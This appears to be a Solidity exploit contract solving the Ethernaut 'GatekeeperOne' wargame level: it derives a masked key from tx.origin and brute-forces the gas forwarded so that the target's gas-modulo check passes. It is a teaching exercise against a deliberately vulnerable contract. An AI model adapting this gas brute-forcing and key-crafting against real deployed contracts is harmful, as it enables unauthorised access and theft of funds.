// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { GatekeeperOne } from "./Level13.sol";

contract L13Attack {
    GatekeeperOne instance;

    constructor(GatekeeperOne _instance) {
        instance = _instance;
    }

    function attack(uint256 forwardGas) external returns (uint256) {
        // payload format => 0x0123456789abcdef
        // uint32 cast => 0x89abcdef
        // uint16 cast => 0xcdef
        // payload => 0x012345670000cdef where cdef is the last 2 bytes of tx.origin
        bytes8 payload = bytes8(uint64(uint160(tx.origin)) & 0xffffffff0000ffff);
        if (forwardGas > 0) {
            instance.enter{ gas: forwardGas }(payload);
            return 0;
        }
        // pass zero as argument and inspect return value to bruteforce the gas amount needed
        for (uint256 i; i < 8191; i++) {
            (bool success,) =
                address(instance).call{ gas: 3 * 8191 + i }(abi.encodeWithSignature("enter(bytes8)", payload));
            if (success) {
                return i;
            }
        }
        return 0;
    }
}
